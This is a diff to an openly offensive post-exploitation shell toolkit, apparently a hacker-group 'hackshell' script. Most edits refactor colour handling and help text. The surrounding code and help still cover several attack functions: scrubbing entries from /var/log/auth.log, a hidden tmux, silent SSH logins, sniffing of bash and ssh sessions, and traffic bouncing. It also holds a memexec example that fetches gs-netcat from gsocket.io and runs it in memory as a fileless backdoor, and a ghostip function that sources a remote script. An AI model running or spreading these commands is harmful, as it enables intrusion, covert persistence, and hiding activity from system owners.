@@ -18,21 +18,32 @@
 #
 # 2024 by theM0ntarCann0n & skpr
 
-CY="\033[1;33m" # yellow
-CG="\033[1;32m" # green
-CR="\033[1;31m" # red
-CB="\033[1;34m" # blue
-CM="\033[1;35m" # magenta
-CC="\033[1;36m" # cyan
-CDR="\033[0;31m" # red
-CDG="\033[0;32m" # green
-CDY="\033[0;33m" # yellow
-CDM="\033[0;35m"
-CDC="\033[0;36m" # cyan
-CF="\033[2m"    # faint
-CN="\033[0m"    # none
-CW="\033[1;37m"
-CUL="\e[4m"
+_hs_init_color() {
+    [ -n "$CY" ] && return
+    CY="\033[1;33m" # yellow
+    CG="\033[1;32m" # green
+    CR="\033[1;31m" # red
+    CB="\033[1;34m" # blue
+    CM="\033[1;35m" # magenta
+    CC="\033[1;36m" # cyan
+    CDR="\033[0;31m" # red
+    CDG="\033[0;32m" # green
+    CDY="\033[0;33m" # yellow
+    CDB="\033[0;34m" # blue
+    CDM="\033[0;35m"
+    CDC="\033[0;36m" # cyan
+    CF="\033[2m"    # faint
+    CN="\033[0m"    # none
+    CW="\033[1;37m"
+    CUL="\e[4m"
+}
+
+# Disable colors if this is not a TTY
+_hs_no_tty_no_color() {
+    [ -t 1 ] && return
+    [ -n "$FORCE" ] && return
+    unset CY CG CR CB CM CC CDR CDG CDY CDB CDM CDC CF CN CW CUL
+}
 
 ### Functions to keep in memory
 _hs_dep() {
@@ -41,7 +52,6 @@ _hs_dep() {
 HS_ERR()  { echo -e >&2  "${CR}ERROR: ${CDR}$*${CN}"; }
 HS_WARN() { echo -e >&2  "${CY}WARN: ${CDM}$*${CN}"; }
 HS_INFO() { echo -e >&2 "${CDG}INFO: ${CDM}$*${CN}"; }
-
 
 xhelp_scan() {
     echo -e "\
@@ -64,7 +74,7 @@ dbin list          - List ALL binaries"
 }
 
 xhelp_tit() {
-    echo -e "
+    echo -e "\
 ${CDC}tit${CN}                   - List PIDS that can be sniffed
 ${CDC}tit read  <PID>${CN}       - Sniff bash shell (bash reads from user input)
 ${CDC}tit read  <PID>${CN}       - Sniff ssh session (ssh reads from user input)
@@ -72,7 +82,7 @@ ${CDC}tit write <PID>${CN}       - Sniff sshd session (sshd writes to the PTY/sh
 }
 
 xhelp_memexec() {
-    echo -e "
+    echo -e "\
 Circumvent the noexec flag or when there is no writeable location on the remote
 file-system to deploy your binary/backdoor.
 
@@ -84,6 +94,21 @@ Or a real world example to deploy gsocket without touching the file system
 or /dev/shm or /tmp (Change the -sSECRET please):
 ${CDC}GS_ARGS=\"-ilqD -sSecretChangeMe31337\" memexec <(curl -SsfL https://gsocket.io/bin/gs-netcat_mini-linux-\$(uname -m))${CN}"
 }
+
+xhelp_bounce() {
+        echo -e "\
+${CDM}Forward ingress traffic to _this_ host onwards to another host
+Usage: bounce <Local Port> <Destination IP> <Destination Port>
+${CDC} bounce 2222  10.0.0.1  22   ${CN}# Forward 2222 to internal host's port 22
+${CDC} bounce 31336 127.0.0.1 8080 ${CN}# Forward 31336 to server's 8080
+${CDC} bounce 31337 8.8.8.8   53   ${CN}# Forward 31337 to 8.8.8.8's 53${CDM}
+
+By default all source IPs are allowed to bounce. To limit to specific
+source IPs use ${CDC}bounceinit 1.2.3.4/24 5.6.7.8/16 ...${CDM}"
+}
+
+noansi() { sed -e 's/\x1b\[[0-9;]*m//g'; }
+alias nocol=noansi
 
 xlog() { local a=$(sed "/${1:?}/d" <"${2:?}") && echo "$a" >"${2:?}"; }
 xsu() {
@@ -355,12 +380,7 @@ bounce() {
     local dstip="$2"
     local dstport="$3"
     [[ $# -lt 3 ]] && {
-        echo -e >&2 "\
-Forward ingress traffic to _this_ host onwards to another host
-Usage: bounce <Local Port> <Destination IP> <Destination Port>
-${CDC} bounce 2222  10.0.0.1  22   ${CN}# Forward 2222 to internal host's port 22
-${CDC} bounce 31336 127.0.0.1 8080 ${CN}# Forward 31336 to server's 8080
-${CDC} bounce 31337 8.8.8.8   53   ${CN}# Forward 31337 to 8.8.8.8's 53$"
+        xhelp_bounce
         return 255
     }
     bounceinit
@@ -380,7 +400,7 @@ crt() {
 ptr() {
     local str
     [ -n "$DNSDBTOKEN" ] && curl -m10 -H "X-API-Key: ${DNSDBTOKEN}" -H "Accept: application/json" -SsfL "https://api.dnsdb.info/lookup/rdata/ip/${1:?}/?limit=5&time_last_after=$(( $(date +%s) - 60 * 60 * 24 * 30))"
-    curl -m10 -SsfL "https://ip.thc.org/api/v1/download?ip_address=${1:?}&limit=10&apex_domain=${2}" | column -t -s,
+    dl "https://ip.thc.org/api/v1/download?ip_address=${1:?}&limit=10&apex_domain=${2}" | column -t -s,
     curl -m10 -SsfL -H "Authorization: Bearer ${IOTOKEN}" "https://ipinfo.io/${1:?}" && echo
     str="$(host "$1" 2>/dev/null)" && echo "${str##* }"
 }
@@ -388,7 +408,7 @@ ptr() {
 rdns() { ptr "$@"; }
 
 ghostip() {
-    source <(curl -fsSL https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/ghostip.sh)
+    source <(dl https://github.com/hackerschoice/thc-tips-tricks-hacks-cheat-sheet/raw/master/tools/ghostip.sh)
 }
 
 ltr() {
@@ -982,7 +1002,6 @@ _hs_resize() {
 }
 
 _hs_mk_pty() {
-    local str='stty -echo;printf "\\e[18t";read -t5 -rdt R;stty sane $(echo "${R:-8;80;25}"|awk -F\; '"'"'{printf "rows "$3" cols "$2;}'"'"')'
     echo -e "${CDM}Upgrading to PTY Shell${CN}"
     echo -e ">>> Press ${CDC}Ctrl-z${CN} now and cut & paste ${CDC}stty raw -echo icrnl opost; fg${CN}"
     echo -e ">>> ${CG}AFTERWARDS${CDG}, Press enter to continue"
@@ -1145,12 +1164,12 @@ ${CY}>>>>> ${CDC}curl -obash -SsfL 'https://bin.ajam.dev/$(uname -m)/bash && chm
 
     HS_SSH_OPT=()
     command -v ssh >/dev/null && {
-        str="$(ssh -V 2>&1)"
+        str="$(\ssh -V 2>&1)"
         [[ "$str" == OpenSSH_[67]* ]] && a="no"
         HS_SSH_OPT+=("-oStrictHostKeyChecking=${a:-accept-new}")
         # HS_SSH_OPT+=("-oUpdateHostKeys=no")
         HS_SSH_OPT+=("-oUserKnownHostsFile=/dev/null")
-        HS_SSH_OPT+=("-oKexAlgorithms=+diffie-hellman-group1-sha1")
+        [[ "$(\ssh -Q kex)" == *"diffie-hellman-group1-sha1"* ]] && HS_SSH_OPT+=("-oKexAlgorithms=+diffie-hellman-group1-sha1")
         [[ "$(\ssh -Q key)" == *"ssh-dss"* ]] && HS_SSH_OPT+=("-oHostKeyAlgorithms=+ssh-dss")
         HS_SSH_OPT+=("-oConnectTimeout=5")
         HS_SSH_OPT+=("-oServerAliveInterval=30")
@@ -1261,18 +1280,19 @@ hs_init_shell() {
 # shellcheck disable=SC2120
 # Output help
 xhelp() {
-
-    [[ "$1" == "scan" ]] && { xhelp_scan; return; }
-    [[ "$1" == "dbin" ]] && { xhelp_dbin; return; }
-    [[ "$1" == "tit" ]] && { xhelp_tit; return; }
-    [[ "$1" == "memexec" ]] && { xhelp_memexec; return; }
+    _hs_no_tty_no_color
+    [[ "$1" == "scan" ]] && { xhelp_scan; _hs_init_color; return; }
+    [[ "$1" == "dbin" ]] && { xhelp_dbin; _hs_init_color; return; }
+    [[ "$1" == "tit" ]] && { xhelp_tit; _hs_init_color; return; }
+    [[ "$1" == "memexec" ]] && { xhelp_memexec; _hs_init_color; return; }
+    [[ "$1" == "bounce" ]] && { xhelp_bounce; _hs_init_color; return; }
 
     echo -en "\
 ${CDC} xlog '1\.2\.3\.4' /var/log/auth.log   ${CDM}Cleanse log file
 ${CDC} xsu username                          ${CDM}Switch user
 ${CDC} xtmux                                 ${CDM}'hidden' tmux ${CN}${CF}[e.g. wont show with 'tmux list-s']
 ${CDC} xssh & xscp                           ${CDM}Silently log in to remote host
-${CDC} bounce <port> <dst-ip> <dst-port>     ${CDM}Bounce tcp traffic to destination
+${CDC} bounce <port> <dst-ip> <dst-port>     ${CDM}Bounce tcp traffic to destination ${CN}${CF}[xhelp bounce]
 ${CDC} ghostip                               ${CDM}Originate from a non-existing IP
 ${CDC} burl http://ipinfo.io 2>/dev/null     ${CDM}Request URL ${CN}${CF}[no https support]
 ${CDC} dl http://ipinfo.io 2>/dev/null       ${CDM}Request URL using one of curl/wget/python/perl/openssl
@@ -1303,8 +1323,10 @@ ${CDC} zapme [<name>]                        ${CDM}Hide args of current shell as
 ${CDC} lt, ltr, lss, lssr, psg, lsg, ...     ${CDM}Common useful commands
 ${CDC} xhelp                                 ${CDM}This help"
     echo -e "${CN}"
+    _hs_init_color
 }
 
+_hs_init_color
 ### Programm
 hs_init "$0"
 hs_init_alias
